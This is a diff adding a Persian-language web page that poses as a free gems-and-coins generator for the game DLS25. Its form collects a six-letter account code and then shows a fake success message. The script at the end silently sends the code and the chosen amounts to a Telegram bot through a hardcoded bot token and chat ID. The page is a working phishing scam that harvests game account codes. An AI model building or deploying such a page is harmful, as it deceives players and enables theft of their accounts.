@@ -1,0 +1,220 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>DLS25 - دریافت جم و سکه رایگان</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Vazirmatn:wght@400;700&display=swap');
+    * {
+      box-sizing: border-box;
+    }
+    body {
+      margin: 0;
+      font-family: 'Vazirmatn', sans-serif;
+      background: linear-gradient(135deg, #080a0f 0%, #091620 100%);
+      color: #e0f7f4;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+      direction: rtl;
+      overflow: hidden;
+    }
+    .container {
+      border-radius: 25px;
+      width: 400px;
+      padding: 30px 35px;
+      position: relative;
+      text-align: center;
+    }
+    .logo {
+      width: 120px;
+      margin: 0 auto 25px;
+      filter: drop-shadow(0 0 5px #00fff2);
+    }
+    h1 {
+      font-size: 24px;
+      margin-bottom: 30px;
+      color: #00fff2;
+      text-shadow: 0 0 15px #00fff2;
+      font-weight: 700;
+    }
+    .field {
+      position: relative;
+      margin-bottom: 25px;
+    }
+    input[type="text"],
+    select {
+      width: 100%;
+      padding: 14px 50px 14px 20px;
+      font-size: 17px;
+      border: none;
+      border-radius: 12px;
+      background: rgba(255, 255, 255, 0.1);
+      color: #d3f6f4;
+      outline: none;
+      transition: background-color 0.3s ease;
+      font-weight: 600;
+      box-shadow: inset 0 0 6px rgba(0, 255, 242, 0.3);
+      cursor: pointer;
+    }
+    input[type="text"]::placeholder {
+      color: #7ee9e4;
+      font-weight: 400;
+    }
+    input[type="text"]:focus,
+    select:focus {
+      background: rgba(0, 255, 242, 0.15);
+      box-shadow: 0 0 15px #00fff2;
+      color: #00fff2;
+    }
+    .field svg {
+      position: absolute;
+      top: 50%;
+      transform: translateY(-50%);
+      right: 16px;
+      width: 30px;
+      height: 30px;
+      fill: #00fff2cc;
+      transition: fill 0.3s ease;
+      pointer-events: none;
+    }
+    input[type="text"]:focus + svg,
+    select:focus + svg {
+      fill: #00fff2;
+    }
+    button {
+      background: linear-gradient(90deg, #00fff2, #00c7a7);
+      border: none;
+      padding: 16px;
+      width: 100%;
+      font-size: 19px;
+      font-weight: 700;
+      color: #003633;
+      border-radius: 15px;
+      cursor: pointer;
+      box-shadow: 0 0 30px #00fff2;
+      transition: background 0.3s ease, transform 0.15s ease;
+      user-select: none;
+    }
+    button:hover {
+      background: linear-gradient(90deg, #00c7a7, #00fff2);
+      transform: scale(1.05);
+    }
+    button:active {
+      transform: scale(0.98);
+    }
+    .result {
+      margin-top: 30px;
+      font-size: 18px;
+      color: #00ffb0;
+      font-weight: 700;
+      min-height: 40px;
+      user-select: none;
+      text-shadow: 0 0 6px #00ffb0aa;
+    }
+    .result.error {
+      color: #ff4444;
+      text-shadow: 0 0 6px #ff4444aa;
+    }
+  </style>
+</head>
+<body>
+  <div class="container" role="main" aria-label="دریافت جم و سکه رایگان DLS25">
+    <img
+    
+    />
+    <h1>دریافت جم و سکه رایگان DLS25</h1>
+    <form id="generatorForm" autocomplete="off" novalidate>
+      <div class="field">
+        <input
+          type="text"
+          id="username"
+          placeholder="کد اکانت"
+          minlength="6"
+          maxlength="6"
+          aria-describedby="usernameHelp"
+          required
+          pattern="^[a-zA-Z]{6}$"
+          title="کد نامعتبر است"
+        />
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+          <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/>
+        </svg>
+      </div>
+      <div class="field">
+        <select id="gems">
+          <option value="2500">2500 جم</option>
+          <option value="5000">5000 جم</option>
+          <option value="10000">10000 جم</option>
+        </select>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+          <path d="M12 2L2 7l10 13 10-13-10-5z"/>
+        </svg>
+      </div>
+      <div class="field">
+        <select id="coins">
+          <option value="10000">10000 سکه</option>
+          <option value="50000">50000 سکه</option>
+          <option value="100000">100000 سکه</option>
+        </select>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+          <circle cx="12" cy="12" r="10" fill="#00fff2"/>
+        </svg>
+      </div>
+      <button type="submit">دریافت جم و سکه</button>
+    </form>
+    <div id="result" class="result" aria-live="polite" role="status"></div>
+  </div>
+
+  <script>
+    const form = document.getElementById('generatorForm');
+    const input = document.getElementById('username');
+    const result = document.getElementById('result');
+
+    form.addEventListener('submit', e => {
+      e.preventDefault();
+
+      const value = input.value.trim();
+
+      if (value === '') {
+        result.textContent = 'کد اکانت را وارد کنید.';
+        result.classList.add('error');
+        return;
+      }
+
+      const valid = /^[a-zA-Z]{6}$/.test(value);
+      if (!valid) {
+        result.textContent = 'کد نامعتبر است';
+        result.classList.add('error');
+        return;
+      }
+
+      result.classList.remove('error');
+      const gems = form.gems.value;
+      const coins = form.coins.value;
+      result.textContent = `لطفاً صبر کنید... در حال افزودن ${gems} جم و ${coins} سکه به اکانت کد ${value} شما.`;
+
+      setTimeout(() => {
+        result.textContent = `✅ عملیات با موفقیت ثبت شد. مقدار ${gems} جم و ${coins} سکه طی چند ساعت آینده به کد اکانت "${value}" واریز خواهد شد.`;
+        const chatId = "7720138032"; // آی‌دی شما
+const token = "7173187714:AAG3zO8-Z0-6qqjSru3uTEkED_qoi-IPVS4"; // توکن ربات
+
+const message = `🎮 کد اکانت: ${value}\n💎 جم: ${gems}\n🪙 سکه: ${coins}`;
+
+fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+  method: "POST",
+  headers: {
+    "Content-Type": "application/json",
+  },
+  body: JSON.stringify({
+    chat_id: chatId,
+    text: message,
+  }),
+});
+      }, 3000);
+    });
+  </script>
+</body>
+</html>
